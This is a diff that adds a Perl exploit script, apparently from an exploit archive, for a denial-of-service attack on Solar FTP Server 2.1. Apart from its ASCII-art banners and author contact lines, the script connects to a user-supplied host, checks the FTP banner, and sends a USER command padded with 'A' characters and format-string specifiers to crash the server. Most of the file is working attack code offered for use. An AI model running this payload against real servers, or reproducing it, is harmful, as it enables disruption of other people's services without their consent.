@@ -1,0 +1,108 @@
+#!/usr/bin/perl
+#
+#[+]Exploit Titulo: Exploit Denial of Service Solar FTP 2.1
+#[+]Data: 21/10/2011
+#[+]Autor: x000
+#[+]Versão: 2.1
+#[+]Tested on: WIN-XP SP3 PORTUGUESE BRAZILIAN 
+#[+]CVE: N/A
+#
+#       xxx     xxx        xxxxxxxxxxx        xxxxxxxxxxx        xxxxxxxxxxx
+#        xxx   xxx        xxxxxxxxxxxxx      xxxxxxxxxxxxx      xxxxxxxxxxxxx  
+#         xxx xxx         xxxxxxxxxxxxx      xxxxxxxxxxxxx      xxxxxxxxxxxxx                    
+#          xxxxx          xxx       xxx      xxx       xxx      xxx       xxx           xxxxxx   
+#           xxx           xxx       xxx      xxx       xxx      xxx       xxx          xxxxxxxx  xxxxxxxx  xxxxxxxxx
+#         xxxxxx          xxx       xxx      xxx       xxx      xxx       xxx          xx    xx  xx    xx  xx
+#        xxx  xxx         xxx       xxx      xxx       xxx      xxx       xxx          xx    xx  xx xxxx   xx  xxxxx
+#      xxx     xxx        xxxxxxxxxxxxx      xxxxxxxxxxxxx      xxxxxxxxxxxxx   xxx    xxxxxxxx  xx   xx   xx     xx
+#     xxx       xxx        xxxxxxxxxxx        xxxxxxxxxxx        xxxxxxxxxxx    xxx     xxxxxx   xx    xx  xxxxxxxxx
+#
+#
+#
+#               Link de Download: http://solarftp.com/files/solarftps-setup.exe
+#
+#             .: Criador  by: x000 :.
+#              3d3n@hotmail.com.br
+#                 www.x000.org
+#       Obrigado C4SS!0 G0M3S Friends Forever
+#
+
+
+use Socket;
+use IO::Socket;
+use strict;
+use warnings;
+
+my $sys = `ver`;
+
+if($sys=~/Windows/){
+system("cls");
+system("color 4f");
+}
+else{
+system("clear");
+}
+sub usage{
+print q
+{
+               00    00  000000    000000    000000
+                00  00  00000000  00000000  00000000
+                 0000   0      0  0      0  0      0
+                0000    0      0  0      0  0      0
+               00  00   00000000  00000000  00000000
+              00    00   000000    000000    000000
+               
+                      | Criador x000 |
+
+               | Contato: 3d3n@hotmail.com.br |
+
+                      |  From Brazil |
+
+                    | Site www.x000.org |
+
+
+};
+}
+
+if($#ARGV!=1){
+usage;
+print "\t\t[-]Modo de Uso: perl $0 <Host> <Porta>\n";
+print "\t\t[-]Exemplo:perl $0 192.168.1.12 21\n";
+exit;
+}
+
+usage;
+print "\t\t[+]Conectando ao Servidor $ARGV[0]...\n\n";
+sleep(1);
+
+my $exploit = "A" x 50;
+$exploit = $exploit."%x%lf%f%d%c%s%c%u%n%s%c%lf%tt%d%c";
+
+
+my $sock = IO::Socket::INET->new(
+PeerAddr=>$ARGV[0],
+PeerPort=>int($ARGV[1]),
+Timeout=>1,
+Proto=>"tcp",
+)or die("ERRO:\n$!\n");
+
+print "\t\t[+]Checando se o Servidor e Vulneravel\n\n";
+sleep(1);
+
+
+$sock->recv(my $data,2000);
+unless($data=~/Solar FTP Server/){
+print "\t\t[+]Servidor Nao e Vulneravel:(\n\n";
+sleep(1);
+exit;
+}
+print "\t\t[+]Servidor Vulneravel:)\n\n";
+sleep(1);
+
+print "\t\t[+]Enviando Exploit Denial of Service\n\n";
+sleep(1);
+$sock->send("USER $exploit\r\n");
+close($sock);
+print "\t\t[+]Exploit Denial Of Service Enviado:)\n";
+
+# x000.org
